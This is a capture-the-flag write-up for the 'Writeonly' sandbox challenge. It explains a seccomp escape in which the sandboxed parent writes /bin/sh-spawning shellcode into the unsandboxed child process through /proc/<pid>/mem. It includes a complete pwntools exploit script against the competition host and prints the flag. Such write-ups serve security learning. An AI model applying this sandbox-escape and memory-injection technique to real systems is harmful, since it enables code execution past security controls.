# Writeonly

## Sandbox - Easy

Statically linked binary - it mmaps a RWX region, reads the length of shellcode from us, then reads that much data from stdin into the mmaped region. It then installs some strict seccomp and executes our shellcode. The goal is to read a file - /home/user/flag. However. read is BANNED. In fact, this seccomp is a whitelist not a blacklist, and few useful things are allowed. For our purposes, we'll use open, lseek and write.

First, the binary forks. The child process does some sort of loop in which it continuously reads 4 bytes out of /home/user/flag and checks it against `CTF{`.The parent reads the shellcode, installs seccomp and runs the shellcode. Since the seccomp is done after forking, the child does not inherit seccomp. This means we can begin to hijack the memory of the child from the parent in our shellcode, and force the child to do things that we cannot. The binary prints the PID of the child, so we can use `/proc/<pid>/mem`. 1. Build `"/proc/<pid>/mem"` on the stack using push and mov 2. `open` this file 3. `lseek` it so that we can write to the `read` function of the child process 4. Build shell popping shellcode on the stack 5. `write` shell popping shellcode to the `read()` function 6. To prevent the parent process exiting before the shell has time to pop, use `jmp $` to continually jump to the current RIP, keeping it alive 7. This works, and a shell is popped. From there, we cat flag to get the flag.

```python
from pwn import *
context.arch = 'amd64'
e = ELF("./chal")
p = e.process() if args.LOCAL else remote('writeonly.2020.ctfcompetition.com', 1337)
p.recvuntil("[DEBUG] child pid: ")
pid = int(p.recvline())
p.clean()
filename = f"/proc/{pid}/mem".encode()
filename = filename.ljust(16,b'\x00')
code = ""
for i in range(0,len(filename),8):
    num = hex(u64(filename[i:i+8]))
    code = f"mov rbx,{num} ; push rbx ; " + code
code += "mov rbx,rsp ; mov rdi,rbx ; mov rax,2 ; mov rsi,0x2 ; syscall ; mov r9,rax ; mov rdi,rax ; mov rsi, 0x44fce8 ; mov rdx,0 ; mov rax,0x8 ; syscall; " 
malcode = b"/bin/sh\x00" + asm("mov rdi, 0x44fce8 ; mov rsi,0 ; mov rdx,0 ; mov rax,0x3b ; syscall") 
malcode = malcode.ljust(40,b'\x00')
newcode = "" 
for i in range(0,len(malcode),8):
    num = hex(u64(malcode[i:i+8]))
    newcode = f"mov rbx,{num} ; push rbx ; " + newcode
code += newcode
code += "mov rdi,r9 ; mov rsi,rsp ; mov rdx,0x28 ; mov rax,0x1 ; syscall ; jmp $"
print(code)
shellcode = asm(code)
p.sendline(str(len(shellcode)))
p.sendline(shellcode)
p.interactive()
```

### CTF{why\_read\_when\_you\_can\_write}

